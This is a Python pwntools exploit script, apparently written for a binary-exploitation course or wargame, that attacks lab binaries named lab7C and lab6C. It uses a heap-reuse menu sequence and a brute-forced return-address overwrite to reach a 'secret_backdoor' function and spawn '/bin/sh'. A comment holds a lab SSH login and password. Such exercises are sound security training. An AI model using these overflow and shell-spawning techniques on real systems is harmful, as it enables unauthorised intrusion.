#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import subprocess
import time
# import signal

#### README ####
# For this to work first attach gdb, break on main and let the process run.
# When the breakpoint hits print secret_backdoor and copy the address 
# clear the last 3 hex values of the copied address and paste it into base_addr 
# finally let the script run, it can take some time
# ex.
# gdb ./lab6C
# break main
# run
# print secret_backdoor
# $1 = {<text variable, no debug info>} 0xb77c372b <secret_backdoor>
#
# base_addr = 0xb77c3000
#### END ####

# def sigint_handler(signum, frame):
#     term_gdb.kill()
#     exit()
 
# signal.signal(signal.SIGINT, sigint_handler)


context.arch = "x86"
# context.log_level = 'debug'
# context.local(aslr=False)
# context.aslr = False

context(terminal = ['terminator', '-e'])

IP = '10.11.12.13'
PORT = 1337
local = True
if not local:
    r = remote(IP, PORT)
else:
    r = process("./lab7C")

# create string
print r.read(200)
r.sendline("1")
print r.readline()
r.sendline("AA")
print r.readline()

# delete string
print r.read(200)
r.sendline("3")

# create number
print r.read(200)
r.sendline("2")
print r.sendline()
r.sendline("1234")

# print string
print r.read(200)
r.sendline("5")
print r.readline()
r.sendline("1")
print r.readline()

r.interactive()


# create number
print r.read(200)
r.sendline("2")
print r.readline()
r.sendline("1234")
print r.readline()

# delete number
print r.read(200)
r.sendline("4")
print r.readline()

# create string
print r.read(200)
r.sendline("1")
print r.readline()
r.sendline("A"*20)
print r.readline()

# print number
print r.read(200)
r.sendline("6")
print r.readline()
r.sendline("1")

r.interactive()





















exit()

gdbscript_file = 'lab6C.gdb.txt'

f = open(gdbscript_file, 'w')
f.write('''
set follow-fork-mode child
print secret_backdoor
continue
''')
# break set_tweet
# break *handle_tweet+114
# continue

f.close()

# term_gdb = subprocess.Popen(['terminator', '-e', '/usr/bin/gdb "./lab6C" %d -x "%s"' % (r.pid, gdbscript_file)])
# time.sleep(1)



# terminator -e '/usr/bin/gdb -q  "./lab6C" 12122 -x "lab6C.gdb.txt"'

# exit()

# shell = ssh('lab6C', '172.16.70.133', password='lab06start', port=22)
# r = shell.process('/levels/lab06/lab6C')

# gdb.attach(r, '''
# set follow-fork-mode child
# break set_tweet
# continue
# '''
# )

# r = process("./lab6C")

found_address = False

system_addr = 0xf7dcd200
base_addr = 0x56555000 #0xb775b000 #
secret_backdoor = 0x0000072b

while not found_address:
    # r = process("/levels/lab06/lab6C")
    r = process("./lab6C")
    # term_gdb = subprocess.Popen(['terminator', '-e', '/usr/bin/gdb "./lab6C" %d -x "%s"' % (r.pid, gdbscript_file)])
    # time.sleep(1)
    # payload = 'A'*(255-59) + p32(base_addr|push_esp_mov_ebx_dword_ptr_esp_ret) + 'C'*(59-4)
    payload = "A"*(255-59)
    payload += p32(base_addr|secret_backdoor)
    payload += "C" * (255 - len(payload))

    r.sendlineafter('>:', 'A'*40+'\xff')

    # p = subprocess.Popen(
    #     ['cat /proc/%d/maps | head -n 1 | cut -d"-" -f1'%r.pid], 
    #     stdin=subprocess.PIPE, 
    #     stdout=subprocess.PIPE, 
    #     stderr=subprocess.PIPE,
    #     shell=True)
    # output, err = p.communicate()
    # output = output.strip()
    # print "%s %s %s"%("="*16, output, "="*16)
    # if output == "56555000":
    #     print "$"*128
    #     found_address = True

    r.sendlineafter('>:', payload)
    ret = r.recv(200)
    ret = r.recv(200)

    ret = ""

    # if found_address:
    # print "found_address"
    r.sendline("/bin/sh")
    r.sendline("whoami")
    try:
        ret = r.recv(200, timeout=0.01)
    except:
        pass
    print "len: %d"%len(ret)
    print "ret: %s"%ret
    print "alex" in ret
    # r.interactive()
    
    if ("alex" in ret):
        print "alex in ret"
        r.interactive()
        quit()
    
    # r.interactive()
    r.close()
    # time.sleep(0.03)
    # r.sendline('ls')

    # r.interactive()


# r.sendlineafter(': ', '1') # option 1 to activate exploit
# r.readuntil(':')
# print r.readline()